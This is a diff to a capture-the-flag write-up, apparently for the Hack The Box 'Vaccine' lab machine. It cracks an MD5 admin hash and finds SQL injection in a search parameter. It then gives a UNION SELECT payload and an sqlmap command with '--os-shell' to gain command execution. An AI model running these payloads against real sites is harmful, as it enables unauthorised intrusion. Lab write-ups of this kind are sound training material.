@@ -44,10 +44,23 @@
 
 	index.php -> login admin password_md5 : "2cb42f8734ea607eefed3b70af13bbd3"
 // decode the hash using online md5 decoder https://www.md5online.org/
+![Image 1](https://github.com/W0lfySec/HTB/blob/main/Images/Vaccine/Screenshot_2021-07-31_14_10_35.png)
 
-"2cb42f8734ea607eefed3b70af13bbd3" -> qwerty789
+	"2cb42f8734ea607eefed3b70af13bbd3" -> qwerty789
 
-![Image 1](https://github.com/W0lfySec/HTB/blob/main/Images/Vaccine/Screenshot_2021-07-31_13_41_32.png)
+// login to http://10.10.10.46/ with credentials 'admin : qwerty789' get us to car catatlog with a search bar
+when i search for 'a' i can see that url changes to http://10.10.10.46/dashboard.php?search=a when i try to insert quots i get an error:
+
+	ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^
+// now we can see that the server is vulnerable for sql injection, from now there is few ways to achive a shell
+### First way(Exploit sql injection)
+// Insert:
+
+	' UNION SELECT NULL, NULL, NULL , NULL, VERSION() --
+
+![Image 2](https://github.com/W0lfySec/HTB/blob/main/Images/Vaccine/Screenshot_2021-07-31_14_40_43.png)
+
+![Image 2](https://github.com/W0lfySec/HTB/blob/main/Images/Vaccine/Screenshot_2021-07-31_13_41_32.png)
 
 sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' 
 	--cookie="PHPSESSID=ikk1tjpq926a0dkboj4hu8r36o" --os-shell
